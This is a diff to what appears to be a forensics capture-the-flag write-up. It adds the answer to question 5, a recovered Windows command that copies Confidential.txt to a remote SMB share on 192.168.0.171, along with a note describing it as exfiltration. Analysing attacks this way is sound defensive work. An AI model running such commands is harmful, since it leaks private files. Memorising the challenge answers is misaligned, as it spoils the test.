@@ -90,10 +90,12 @@ Attacker tried to set an alias for IEX, this could be an attempt to obfuscate ma
 
 12. It's clear that the attacker tried to set an alias for **Invoke Expression** cmdlet.
 
-> 5TH QUESTION --> ANS:
+> 5TH QUESTION --> ANS: `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8685233d-1834-4426-98a0-9cb2afe2ea39)
 
+
+13. Analyzing the CMD history, we can identify an attempt of the attacker to exfiltrate the content of the **Confidential.txt** to his file named **pass.txt** inside **pulice** directory.
 
 > 6TH QUESTION --> ANS:
 
